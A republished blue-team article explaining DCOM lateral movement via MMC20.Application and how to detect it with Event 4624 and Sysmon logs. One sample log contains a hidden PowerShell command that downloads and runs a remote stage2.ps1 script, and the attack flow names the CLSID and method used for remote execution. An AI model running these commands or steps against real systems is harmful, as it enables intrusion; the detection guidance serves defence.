@@ -1,0 +1,452 @@
+# https://core-jmp.org/2026/06/dcom-lateral-movement-detection-explained/
+
+<!DOCTYPE html><html class="js audio canvas fullscreen svg video cssanimations boxshadow csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox csscalc no-flexboxtweener cssgradients csstransforms supports csstransforms3d csstransitions objectfit object-fit cssclippathsvg cssclippathinset cssclippathcircle cssclippathellipse cssclippathpolygon" lang="en-US" style="">
+
+<body class="wp-singular post-template-default single single-post postid-3860 single-format-standard wp-custom-logo wp-theme-phlox wp-child-theme-phlox-child cjmp phlox aux-boxed aux-resp aux-hd aux-page-animation-off aux-dom-ready" data-framed="">
+
+<div id="inner-body">
+
+<div id="cjmp-progress" style="width: 0%;"></div>
+
+
+
+<main id="main" class="cjmp-main">
+	<div class="article-wrap">
+
+		<div class="article-head" id="cjmp-article">
+			<div class="crumb">
+				<a href="https://core-jmp.org/">Home</a>
+				<span class="sep">/</span><a href="https://core-jmp.org/security/blue-team/">Blue team</a>			</div>
+
+			<div class="tags"><a class="tag" href="https://core-jmp.org/security/blue-team/">Blue team</a><a class="tag" href="https://core-jmp.org/security/windows/">windows</a></div>
+			<h1>DCOM Explained: How Attackers Turn a Windows Feature into a Lateral Movement Tool</h1>
+
+							<p class="deck">Distributed COM (DCOM) lets one Windows host instantiate and drive COM objects on another over the network — and that same capability is a favourite lateral-movement primitive. This walkthrough covers the DCOM architecture, a step-by-step attack flow from a dumped credential to a child PowerShell process, and the correlated Event ID 4624 and Sysmon telemetry that exposes it.</p>
+			
+			<div class="art-meta">
+				<span class="avatar"><img alt="" src="https://secure.gravatar.com/avatar/3dee7d2fb3c89c03da14239a3f304ccaad434e90c3125929b06a602b9c20e315?s=72&amp;d=mm&amp;r=g" class="avatar avatar-72 photo" height="72" width="72" decoding="async"></span>
+				<b style="color:var(--ink-soft)">oxfemale</b><span class="dot"></span>
+				<span>June 23, 2026</span><span class="dot"></span>
+				<span>11 min read</span>
+				<span class="dot"></span><span class="views-inline"><svg class="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="2.6"></circle></svg>144 reads</span>			</div>
+
+			<div class="toolbar">
+				<button class="tbtn" id="cjmp-artLangBtn" aria-haspopup="true">
+					<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.7 2.7 2.7 15.3 0 18M12 3c-2.7 2.7-2.7 15.3 0 18"></path></svg>
+					Translate</button>
+				<a class="tbtn primary" href="https://core-jmp.org/wp-admin/admin-post.php?action=generate_pdf_sunarc&amp;post_id=3860&amp;post_to_pdf_exporter_nonce=62b6633a4f" id="cjmp-pdfBtn" rel="nofollow">
+					<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v11M8 10l4 4 4-4"></path><path d="M4 20h16"></path></svg>
+					Export PDF</a>
+				<button class="tbtn" id="cjmp-copyBtn" data-url="https://core-jmp.org/2026/06/dcom-lateral-movement-detection-explained/">
+					<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 007.5.5l2-2a5 5 0 00-7-7l-1 1"></path><path d="M14 11a5 5 0 00-7.5-.5l-2 2a5 5 0 007 7l1-1"></path></svg>
+					Copy link</button>
+			</div>
+		</div>
+
+		
+
+		<article class="post" id="cjmp-postBody">
+							<figure class="article-lead-img"><img width="900" height="900" src="https://core-jmp.org/wp-content/uploads/2026/06/1p7oKe8c8TS1sxgi3BDu67A-1024x1024.png" class="attachment-large size-large wp-post-image" alt="DCOM Explained: How Attackers Turn a Windows Feature into a Lateral Movement Tool" decoding="async" fetchpriority="high"></figure>
+						
+<div style="border-left:4px solid #d63638;padding:14px 18px;background:#fff5f5;margin:18px 0;font-size:14px;">
+<strong>Original text:</strong> <a href="https://detect.fyi/dcom-explained-how-attackers-turn-a-windows-feature-into-a-lateral-movement-tool-f3c07ce94866" target="_blank" rel="noopener nofollow">“DCOM Explained: How Attackers Turn a Windows Feature into a Lateral Movement Tool”</a> — <strong>Zshan Hyder</strong>, Detect FYI (June 2026). The event-log samples and figures below are reproduced verbatim with attribution captions.
+</div>
+
+
+<h2 class="wp-block-heading" id="sec-0">Executive Summary</h2>
+
+
+<p class="wp-block-paragraph">Component Object Model (COM) is the plumbing that lets two applications on a single Windows host talk to each other — the mechanism behind embedding an Excel chart into a Word document, for example. Distributed COM (DCOM) takes that same model and stretches it across the network, so a client on one machine can instantiate and call methods on a COM object hosted by another machine. That is a legitimate, useful administrative capability. It is also exactly why DCOM keeps showing up in lateral-movement alerts: an attacker who already holds valid credentials can ask a remote host to instantiate a trusted, signed COM object and have it run commands on their behalf — without dropping a single file.</p>
+
+
+<p class="wp-block-paragraph">This article breaks down what DCOM is, the Windows components and ports that make it work, and a concrete attack flow in which a dumped credential is turned into remote code execution through <code>MMC20.Application</code> and a child <code>powershell.exe</code>. It then turns defensive: which events to correlate (network logons, RPC over TCP 135, and anomalous parent/child process chains under <code>svchost.exe</code>), the Sysmon and Security-log artefacts that reveal each step, and the hardening that shuts the technique down. The goal is to give SOC analysts enough mental model to actually investigate a DCOM alert rather than just close it.</p>
+
+
+<h2 class="wp-block-heading" id="sec-1">What Is DCOM, and Why Does It Exist?</h2>
+
+
+<figure class="wp-block-image size-large"><img decoding="async" src="https://core-jmp.org/wp-content/uploads/2026/06/1xkOtY_GErYZPM0jnU9a8Vg.png" alt="COM enables communication between applications on one computer; DCOM extends it across a network"><figcaption>COM connects applications on a single host; DCOM extends that communication across the network. <em>Source: original article.</em></figcaption></figure>
+
+
+<p class="wp-block-paragraph">To understand DCOM you first have to understand COM. COM is the technology that lets two applications running on the <em>same</em> computer exchange data and functionality. The classic example is dropping an Excel chart or table into a Word document — COM is what quietly brokers that interaction in the background.</p>
+
+
+<p class="wp-block-paragraph">DCOM is COM with a network leg. It behaves the same way, but the two applications no longer have to live on the same box: with DCOM, a program on Computer A can reach out and execute a script or program on Computer B. Everything else — the attack surface, the detection story — flows from that one extension. The rest of this section digs into the architecture that makes it possible.</p>
+
+
+<h2 class="wp-block-heading" id="sec-2">How DCOM Works</h2>
+
+
+<h3 class="wp-block-heading" id="sec-3">DCOM Components</h3>
+
+
+<p class="wp-block-paragraph">A DCOM call is a collaboration between several Windows components and services. The pieces that matter are:</p>
+
+
+<ul class="wp-block-list">
+<li><strong>Client application</strong> — the program on the source host that kicks off the remote connection. That could be an admin’s legitimate management tool, or an attacker’s script.</li>
+<li><strong>COM APIs</strong> — the built-in Windows interfaces the client uses to ask the OS to locate and launch a component on a remote server. The key one here is <code>CoCreateInstanceEx()</code>.</li>
+<li><strong>Class IDs (CLSID)</strong> — 128-bit GUIDs assigned to every registered Windows component. A CLSID is the precise address that tells Windows exactly which application or service to spin up.</li>
+<li><strong>RPCSS and the Endpoint Mapper (<code>rpcss.dll</code>)</strong> — the central routing service for remote requests. Its Endpoint Mapper listens on <strong>TCP port 135</strong>, checks permissions, and steers the incoming connection to the correct dynamic high port.</li>
+<li><strong>Service Host (<code>svchost.exe</code>)</strong> — the generic host process that runs background services such as <code>rpcss.dll</code>, which ship as DLLs and cannot run as standalone executables.</li>
+<li><strong>Service Control Manager (<code>services.exe</code>)</strong> — the Windows service manager, running in its own process, responsible for resolving the requested CLSID and launching the target application or service.</li>
+</ul>
+
+
+<h3 class="wp-block-heading" id="sec-4">The DCOM Workflow</h3>
+
+
+<figure class="wp-block-image size-large"><img decoding="async" src="https://core-jmp.org/wp-content/uploads/2026/06/1mFsLd9q0Pf0qhrsSyYQpgg-scaled.png" alt="The DCOM workflow from CoCreateInstanceEx through RPCSS, SCM and the dynamic high port"><figcaption>The end-to-end DCOM workflow, from the client’s API call through RPCSS, the SCM, and the negotiated high port. <em>Source: original article.</em></figcaption></figure>
+
+
+<ol class="wp-block-list">
+<li><strong>Step 1:</strong> The client calls the COM API <code>CoCreateInstanceEx()</code>, passing the CLSID of the target component and the IP address of the target server.</li>
+<li><strong>Step 2:</strong> The request is handed to the local RPCSS service, which builds the network packet.</li>
+<li><strong>Step 3:</strong> The client connects to the target server over TCP port 135, where the target’s RPCSS Endpoint Mapper accepts the connection.</li>
+<li><strong>Step 4:</strong> The target’s RPCSS looks the CLSID up in the local registry under <code>HKCR\CLSID</code> and verifies that the requesting user has the necessary permissions.</li>
+<li><strong>Step 5:</strong> If the permission check passes, RPCSS tells the Service Control Manager to spawn the requested process — for example WMI (<code>wmiprvse.exe</code>) or MMC (<code>mmc.exe</code>) — assigns a dynamic high-numbered TCP port for the rest of the conversation, and closes the initial port-135 connection.</li>
+<li><strong>Step 6:</strong> With the new channel open on the high port, the client invokes its commands on the target through methods such as <code>IRemUnknown</code>.</li>
+</ol>
+
+
+<h2 class="wp-block-heading" id="sec-5">DCOM and Lateral Movement</h2>
+
+
+<p class="wp-block-paragraph">Lateral movement is how attackers spread through a network after the initial compromise — hopping from host to host to escalate privilege and reach their real objective. Because DCOM can execute code across machines by design, it is a proven and attractive vehicle for exactly that.</p>
+
+
+<p class="wp-block-paragraph">There are two broad flavours of DCOM abuse: remote code execution, and abuse of native application functionality. They differ in detail but share a mechanism — leaning on Windows DCOM to invoke PowerShell or CMD to run arbitrary commands, or to call into the built-in methods that certain DCOM-enabled applications already expose. The example below walks through a simple remote-code-execution flow that moves laterally from Machine A to Machine B.</p>
+
+
+<h3 class="wp-block-heading" id="sec-6">Attack Flow of DCOM-Based Lateral Movement</h3>
+
+
+<figure class="wp-block-image size-large"><img decoding="async" src="https://core-jmp.org/wp-content/uploads/2026/06/1Gp8ABMpzqzJ0TjonfdnePQ-scaled.png" alt="Attack flow of DCOM-based lateral movement from Machine A to Machine B"><figcaption>DCOM lateral movement, end to end: credential theft on Machine A leads to a trusted binary executing the attacker’s command on Machine B. <em>Source: original article.</em></figcaption></figure>
+
+
+<ol class="wp-block-list">
+<li>The attacker starts by dumping credentials from the Local Security Authority Subsystem (<code>lsass.exe</code>) on Machine A. What they need is either the NTLM hash or the plaintext password of a domain account that is also valid on the target, Machine B.</li>
+<li>From Machine A, they open a handshake to Machine B over TCP port 135. That RPC request lands on the RPC Endpoint Mapper (<code>rpcss.dll</code>) on Machine B.</li>
+<li>Once authenticated, the attacker requests a COM object by CLSID. For instance, CLSID <code>C085698C-D16F-417A-8851-A263C70D21B6</code> instructs the target to instantiate <code>MMC20.Application</code>.</li>
+<li>Before anything runs, Machine B checks whether the authenticated account is actually permitted to launch or activate that application. Only after that check passes does the system treat the request as a legitimate, remotely initiated admin task.</li>
+<li>With the COM object live, the attacker calls a method the object already exposes — such as <code>ExecuteShellCommand</code>. Note that nothing malicious is written to disk: they are simply telling a trusted, signed Windows binary to launch a secondary process.</li>
+<li>When the command fires, the requested application — Microsoft Management Console (<code>mmc.exe</code>) — is spawned as a child of <code>svchost.exe</code>, and the attacker’s commands execute from there.</li>
+</ol>
+
+
+<h2 class="wp-block-heading" id="sec-7">Detecting, Investigating, and Preventing DCOM Lateral Movement</h2>
+
+
+<h3 class="wp-block-heading" id="sec-8">Detection</h3>
+
+
+<p class="wp-block-paragraph">No single event proves DCOM lateral movement — detection is behavioural. You correlate several events that together represent the steps in the attack flow above. A workable strategy looks like this.</p>
+
+
+<p class="wp-block-paragraph">Start by watching for <strong>Event ID 4624</strong> with <strong>Logon Type 3</strong>, which is a remote/network logon. On its own this filter is noisy and produces plenty of false positives, but correlated with the criteria below it becomes accurate.</p>
+
+
+<div class="codeblock"><div class="code-head"><span class="dots"><i style="background:#ff5f56"></i><i style="background:#ffbd2e"></i><i style="background:#27c93f"></i></span><button class="copy" type="button">copy</button></div><pre class="wp-block-code"><code class="hljs">Mar 14 09:32:17 FINSERV-DC01 Microsoft-Windows-Security-Auditing[652]:
+EventID=4624
+RecordID=1084923
+TimeGenerated=2025-03-14T09:32:17.004821200Z
+Channel=Security
+Computer=FINSERV-DC01.corp.local
+EventType=AUDIT_SUCCESS
+SubjectUserSid=S-1-0-0
+SubjectUserName=-
+SubjectDomainName=-
+SubjectLogonId=0x0
+LogonType=3
+TargetUserSid=S-1-5-21-3472813290-1748223498-2940127341-1105
+TargetUserName=john.smith
+TargetDomainName=CORP
+TargetLogonId=0x7C3A21
+LogonProcessName=NtLmSsp
+AuthenticationPackageName=NTLM
+WorkstationName=WKSTN-042
+LogonGuid={00000000-0000-0000-0000-000000000000}
+LmPackageName=NTLM V2
+KeyLength=128
+ProcessId=0x0
+ProcessName=-
+IpAddress=192.168.10.42
+IpPort=49832
+ImpersonationLevel=Impersonation
+ElevatedToken=Yes</code></pre></div>
+
+
+<p class="wp-block-paragraph">Next, look for RPC connections over TCP port 135 between two workstations — workstation-to-workstation RPC on the Endpoint Mapper port is unusual in most environments.</p>
+
+
+<div class="codeblock"><div class="code-head"><span class="dots"><i style="background:#ff5f56"></i><i style="background:#ffbd2e"></i><i style="background:#27c93f"></i></span><button class="copy" type="button">copy</button></div><pre class="wp-block-code"><code class="hljs java">Mar <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">32</span>:<span class="hljs-number">19</span> FINSERV-DC01 Microsoft-Windows-Sysmon[<span class="hljs-number">1248</span>]:
+EventID=<span class="hljs-number">3</span>
+RecordID=<span class="hljs-number">1084927</span>
+TimeGenerated=<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">14</span>T09:<span class="hljs-number">32</span>:<span class="hljs-number">19.118372600</span>Z
+Channel=Microsoft-Windows-Sysmon/Operational
+Computer=FINSERV-DC01.corp.local
+EventType=INFO
+RuleName=-
+UtcTime=<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">32</span>:<span class="hljs-number">19.118</span>
+ProcessGuid={<span class="hljs-number">5f</span>3a8b1c-<span class="hljs-number">0</span>d4e-<span class="hljs-number">4</span>a72-<span class="hljs-number">9</span>c1f-<span class="hljs-number">3</span>a7b2e9d4c81}
+ProcessId=<span class="hljs-number">652</span>
+Image=C:\Windows\System32\svchost.exe
+User=NT AUTHORITY\NETWORK SERVICE
+Protocol=tcp
+Initiated=<span class="hljs-keyword">false</span>
+SourceIsIpv6=<span class="hljs-keyword">false</span>
+SourceIp=<span class="hljs-number">192.168</span>.10.42
+SourceHostname=WKSTN-<span class="hljs-number">042</span>.corp.local
+SourcePort=<span class="hljs-number">49832</span>
+SourcePortName=-
+DestinationIsIpv6=<span class="hljs-keyword">false</span>
+DestinationIp=<span class="hljs-number">10.40</span>.2.10
+DestinationHostname=FINSERV-DC01.corp.local
+DestinationPort=<span class="hljs-number">135</span>
+DestinationPortName=epmap</code></pre></div>
+
+
+<p class="wp-block-paragraph">Then hunt for the tell-tale process lineage: a DCOM host such as <code>mmc.exe</code> or <code>excel.exe</code> spawned under <code>svchost.exe</code>, the DCOM launcher.</p>
+
+
+<div class="codeblock"><div class="code-head"><span class="dots"><i style="background:#ff5f56"></i><i style="background:#ffbd2e"></i><i style="background:#27c93f"></i></span><button class="copy" type="button">copy</button></div><pre class="wp-block-code"><code class="hljs">Mar 14 09:32:21 FINSERV-DC01 Microsoft-Windows-Sysmon[1248]:
+EventID=1
+RecordID=1084931
+TimeGenerated=2025-03-14T09:32:21.402915800Z
+Channel=Microsoft-Windows-Sysmon/Operational
+Computer=FINSERV-DC01.corp.local
+EventType=INFO
+RuleName=technique_id=T1021.003,technique_name=DCOM
+UtcTime=2025-03-14 09:32:21.402
+ProcessGuid={9c2e7a4d-1f8b-4c63-8a2d-7e5f9b3c0d64}
+ProcessId=4108
+Image=C:\Windows\System32\mmc.exe
+FileVersion=10.0.19041.1
+Description=Microsoft Management Console
+Product=Microsoft Windows Operating System
+Company=Microsoft Corporation
+OriginalFileName=MMC.EXE
+CommandLine=C:\Windows\System32\mmc.exe -Embedding
+CurrentDirectory=C:\Windows\System32\
+User=CORP\john.smith
+LogonGuid={00000000-0000-0000-0000-000000000000}
+LogonId=0x7C3A21
+TerminalSessionId=0
+IntegrityLevel=High
+Hashes=SHA256=A1B2C3D4E5F60718293A4B5C6D7E8F90112233445566778899AABBCCDDEEFF
+ParentProcessGuid={5f3a8b1c-0d4e-4a72-9c1f-3a7b2e9d4c81}
+ParentProcessId=652
+ParentImage=C:\Windows\System32\svchost.exe
+ParentCommandLine=C:\Windows\System32\svchost.exe -k DcomLaunch -p -s DcomLaunch
+ParentUser=NT AUTHORITY\NETWORK SERVICE</code></pre></div>
+
+
+<p class="wp-block-paragraph">Finally, look for an interpreter — <code>cmd.exe</code> or <code>powershell.exe</code> — spawned as a child of one of those DCOM host processes (<code>mmc.exe</code>, <code>excel.exe</code>, and friends). That is where the actual payload tends to surface.</p>
+
+
+<div class="codeblock"><div class="code-head"><span class="dots"><i style="background:#ff5f56"></i><i style="background:#ffbd2e"></i><i style="background:#27c93f"></i></span><button class="copy" type="button">copy</button></div><pre class="wp-block-code"><code class="hljs java">Mar <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">32</span>:<span class="hljs-number">24</span> FINSERV-DC01 Microsoft-Windows-Sysmon[<span class="hljs-number">1248</span>]:
+EventID=<span class="hljs-number">1</span>
+RecordID=<span class="hljs-number">1084936</span>
+TimeGenerated=<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">14</span>T09:<span class="hljs-number">32</span>:<span class="hljs-number">24.665203100</span>Z
+Channel=Microsoft-Windows-Sysmon/Operational
+Computer=FINSERV-DC01.corp.local
+EventType=INFO
+RuleName=technique_id=T1059.001,technique_name=PowerShell
+UtcTime=<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">32</span>:<span class="hljs-number">24.665</span>
+ProcessGuid={<span class="hljs-number">2e7</span>c5b9f-<span class="hljs-number">4</span>a3d-<span class="hljs-number">4e91</span>-<span class="hljs-number">8</span>b6f-<span class="hljs-number">1</span>c9a5d7e8f43}
+ProcessId=<span class="hljs-number">5236</span>
+Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion=<span class="hljs-number">10.0</span>.19041.1
+Description=Windows PowerShell
+Product=Microsoft Windows Operating System
+Company=Microsoft Corporation
+OriginalFileName=PowerShell.EXE
+CommandLine=powershell.exe -NoProfile -WindowStyle Hidden -Command <span class="hljs-string">"IEX (New-Object Net.WebClient).DownloadString('http://10.40.2.10:8080/stage2.ps1')"</span>
+CurrentDirectory=C:\Windows\System32\
+User=CORP\john.smith
+LogonGuid={<span class="hljs-number">00000000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">0000</span>-<span class="hljs-number">000000000000</span>}
+LogonId=<span class="hljs-number">0x7C3A21</span>
+TerminalSessionId=<span class="hljs-number">0</span>
+IntegrityLevel=High
+Hashes=SHA256=F1E2D3C4B5A6079889706152433425167890ABCDEF1234567890ABCDEF1234
+ParentProcessGuid={<span class="hljs-number">9</span>c2e7a4d-<span class="hljs-number">1f</span>8b-<span class="hljs-number">4</span>c63-<span class="hljs-number">8</span>a2d-<span class="hljs-number">7e5f</span>9b3c0d64}
+ParentProcessId=<span class="hljs-number">4108</span>
+ParentImage=C:\Windows\System32\mmc.exe
+ParentCommandLine=C:\Windows\System32\mmc.exe -Embedding
+ParentUser=CORP\john.smith</code></pre></div>
+
+
+<p class="wp-block-paragraph">The original author has published a correlation rule that ties steps 1, 3, and 4 together. It is available in their detection-engineering repository: <a href="https://github.com/zshanhyder01/Detection-Engineering/tree/main/lateral_movement/dynamic_component_object_model_dcom" target="_blank" rel="noopener nofollow">zshanhyder01/Detection-Engineering — lateral_movement/dynamic_component_object_model_dcom</a>.</p>
+
+
+<h3 class="wp-block-heading" id="sec-9">Prevention</h3>
+
+
+<p class="wp-block-paragraph">Prevention mirrors the detection logic. To shut the technique down:</p>
+
+
+<ul class="wp-block-list">
+<li>Block workstation-to-workstation communication on TCP port 135 to disable the DCOM activation path between peers.</li>
+<li>Remove or disable remote activation rights for non-admin users across all servers and workstations.</li>
+<li>Deploy LAPS so the same local administrator credential is never reused across multiple machines.</li>
+</ul>
+
+
+<h2 class="wp-block-heading" id="sec-10">Key Takeaways</h2>
+
+
+<ul class="wp-block-list">
+<li>DCOM is COM extended over the network — a legitimate admin capability that doubles as a lateral-movement primitive (MITRE ATT&amp;CK <strong>T1021.003</strong>).</li>
+<li>The activation handshake rides on the RPC Endpoint Mapper at <strong>TCP port 135</strong>, after which traffic moves to a negotiated dynamic high port.</li>
+<li>Abuse is fileless: the attacker drives a trusted, signed binary (e.g. <code>MMC20.Application</code> via <code>mmc.exe</code>) rather than dropping malware.</li>
+<li>The reliable behavioural signature is the process chain — an interpreter such as <code>powershell.exe</code> descending from a DCOM host (<code>mmc.exe</code>/<code>excel.exe</code>) under <code>svchost.exe -k DcomLaunch</code>.</li>
+<li>Detection works by <em>correlation</em>: a Type 3 logon (4624), RPC over TCP 135 between workstations, and the anomalous parent/child lineage — any one alone is too noisy.</li>
+<li>It depends on a prior win: valid credentials (NTLM hash or plaintext) harvested from <code>lsass.exe</code> are the prerequisite.</li>
+</ul>
+
+
+<h2 class="wp-block-heading" id="sec-11">Defensive Recommendations</h2>
+
+
+<ul class="wp-block-list">
+<li><strong>Segment with host firewalls.</strong> Block inbound TCP 135 (and the dynamic RPC high-port range) between workstations; peer-to-peer RPC is rarely legitimate on an endpoint LAN.</li>
+<li><strong>Tighten DCOM activation rights.</strong> Strip remote launch/activation permissions from non-administrative users via the system-wide DCOM ACLs (<code>dcomcnfg</code> / the <code>MachineLaunchRestriction</code> security descriptor).</li>
+<li><strong>Break credential reuse.</strong> Deploy LAPS (or Windows LAPS) so each machine has a unique local admin password, removing the pivot that makes one stolen hash useful everywhere.</li>
+<li><strong>Protect LSASS.</strong> Enable Credential Guard, LSA protection (RunAsPPL), and Defender ASR rules that block credential dumping — this denies the prerequisite for the whole chain.</li>
+<li><strong>Hunt the lineage continuously.</strong> Alert on any child of a DCOM host (<code>mmc.exe</code>, <code>excel.exe</code>, <code>mmc20</code>, <code>visio</code>, etc.) that launches <code>cmd.exe</code> or <code>powershell.exe</code>, especially with <code>-Embedding</code> on the parent.</li>
+<li><strong>Instrument with Sysmon.</strong> Ensure Event ID 1 (process creation, with parent command line) and Event ID 3 (network connection) are collected, and map detections to ATT&amp;CK T1021.003.</li>
+<li><strong>Enforce least privilege and PowerShell logging.</strong> Constrained Language Mode, script-block logging, and removing local-admin rights from day-to-day accounts all raise the cost of the final execution step.</li>
+</ul>
+
+
+<h2 class="wp-block-heading" id="sec-12">Conclusion</h2>
+
+
+<p class="wp-block-paragraph">DCOM is a textbook example of a feature, not a flaw, being repurposed by attackers: it does precisely what it was designed to do — activate a component on a remote host — and that is what makes the abuse so quiet. The technique leaves no dropped binary and runs through trusted, signed processes, so the only durable defence is to understand the workflow well enough to recognise its footprint. Correlate the network logon, the port-135 RPC, and the unusual parent/child process chain, lock down activation rights and credential reuse, and a DCOM alert stops being a mystery and becomes a quick, confident investigation.</p>
+
+
+<p class="wp-block-paragraph"><em>Original text: <a href="https://detect.fyi/dcom-explained-how-attackers-turn-a-windows-feature-into-a-lateral-movement-tool-f3c07ce94866" target="_blank" rel="noopener nofollow">“DCOM Explained: How Attackers Turn a Windows Feature into a Lateral Movement Tool”</a> by <strong>Zshan Hyder</strong> at Detect FYI.</em></p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title" id="sec-13">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-3860" class="share-facebook sd-button share-icon" href="https://core-jmp.org/2026/06/dcom-lateral-movement-detection-explained/?share=facebook&amp;nb=1" target="_blank" aria-labelledby="sharing-facebook-3860">
+				<span id="sharing-facebook-3860">Share on Facebook (Opens in new window)</span>
+				<span>Facebook</span>
+			</a></li><li class="share-x"><a rel="nofollow noopener noreferrer" data-shared="sharing-x-3860" class="share-x sd-button share-icon" href="https://core-jmp.org/2026/06/dcom-lateral-movement-detection-explained/?share=x&amp;nb=1" target="_blank" aria-labelledby="sharing-x-3860">
+				<span id="sharing-x-3860">Share on X (Opens in new window)</span>
+				<span>X</span>
+			</a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-252212136-3860-6a7841bb4f158" data-src="https://widgets.wp.com/likes/?ver=16.0.1#blog_id=252212136&amp;post_id=3860&amp;origin=core-jmp.org&amp;obj_id=252212136-3860-6a7841bb4f158" data-name="like-post-frame-252212136-3860-6a7841bb4f158" data-title="Like or Reblog"><h3 class="sd-title" id="sec-14">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading"><svg class="jetpack-spinner" width="18" height="18" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><circle cx="50" cy="50" r="46" fill="none" stroke="#ddd" stroke-width="8"></circle><path d="M 50 4 A 46 46 0 0 1 96 50" fill="none" stroke="currentColor" stroke-width="8" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" dur="1.4s" from="0 50 50" to="360 50 50" repeatCount="indefinite"></animateTransform></path></svg><span class="screen-reader-text">Loading…</span></span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div>					</article>
+
+		<div class="post-foot">
+							<div class="tags"><a class="chip" href="https://core-jmp.org/security/blue-team/">#blue-team</a><a class="chip" href="https://core-jmp.org/security/com-dcom/">#com-dcom</a><a class="chip" href="https://core-jmp.org/security/detection-engineering/">#detection-engineering</a><a class="chip" href="https://core-jmp.org/security/lateral-movement/">#lateral-movement</a><a class="chip" href="https://core-jmp.org/security/mitre-attck/">#mitre-attck</a><a class="chip" href="https://core-jmp.org/security/ntlm-hash-extraction/">#ntlm-hash-extraction</a><a class="chip" href="https://core-jmp.org/security/powershell/">#powershell</a><a class="chip" href="https://core-jmp.org/security/rpc/">#rpc</a><a class="chip" href="https://core-jmp.org/security/sysmon/">#sysmon</a><a class="chip" href="https://core-jmp.org/security/windows-internals/">#windows-internals</a></div>
+			
+			<div class="authorbox">
+				<span class="avatar"><img alt="" src="https://secure.gravatar.com/avatar/3dee7d2fb3c89c03da14239a3f304ccaad434e90c3125929b06a602b9c20e315?s=92&amp;d=mm&amp;r=g" class="avatar avatar-92 photo" height="92" width="92" decoding="async"></span>
+				<div>
+					<b>oxfemale</b>
+					<span>Vulnerability research, reverse engineering, and exploit development.</span>
+				</div>
+			</div>
+
+							<div class="prevnext">
+											<a class="pn" href="https://core-jmp.org/2026/06/how-llms-actually-work-transformer-internals-walkthrough/"><span class="k">← previous</span><b>How LLMs Actually Work: A Transformer Internals Walkthrough</b></a>
+																<a class="pn nx" href="https://core-jmp.org/2026/06/usbliter8-apple-a12-a13-secureroom-usb-bootrom-exploit/"><span class="k">next →</span><b>usbliter8: A BootROM USB Heap Underflow on Apple A12/A13 SecureROM</b></a>
+									</div>
+					</div>
+
+		<section class="cjmp-related"><div class="sec-head"><h2><span class="addr">0x05</span> // Related reading</h2></div><div class="grid">	<article class="card">
+		<a class="cover" href="https://core-jmp.org/2026/07/how-i-ruined-my-vacation-reverse-engineering-wsc/"><img width="900" height="373" src="https://core-jmp.org/wp-content/uploads/2026/07/worked.Cg7kLDpy_17QOVH-1024x424.webp" class="attachment-large size-large wp-post-image" alt="How I Ruined My Vacation by Reverse Engineering WSC" loading="lazy" decoding="async"><span class="cat">Reverse Engineering</span><span class="views"><span class="views-inline"><svg class="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="2.6"></circle></svg>151</span></span></a>		<div class="body">
+			<div class="tags"><a class="tag" href="https://core-jmp.org/security/reverse-engineering/">Reverse Engineering</a><a class="tag" href="https://core-jmp.org/security/windows/">windows</a></div>
+			<h3><a href="https://core-jmp.org/2026/07/how-i-ruined-my-vacation-reverse-engineering-wsc/">How I Ruined My Vacation by Reverse Engineering WSC</a></h3>
+			<p>es3n1n built defendnot—a tool that deregisters any installed antivirus from Windows Security Center—over a four-day vacation in Seoul. This day-by-day diary traces…</p>
+			<div class="foot">
+				<span>oxfemale</span><span>·</span>
+				<span>Jul 6</span><span>·</span>
+				<span>11 min</span>
+				<span>·</span><span class="views-inline"><svg class="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="2.6"></circle></svg>151</span>			</div>
+		</div>
+	</article>
+		<article class="card">
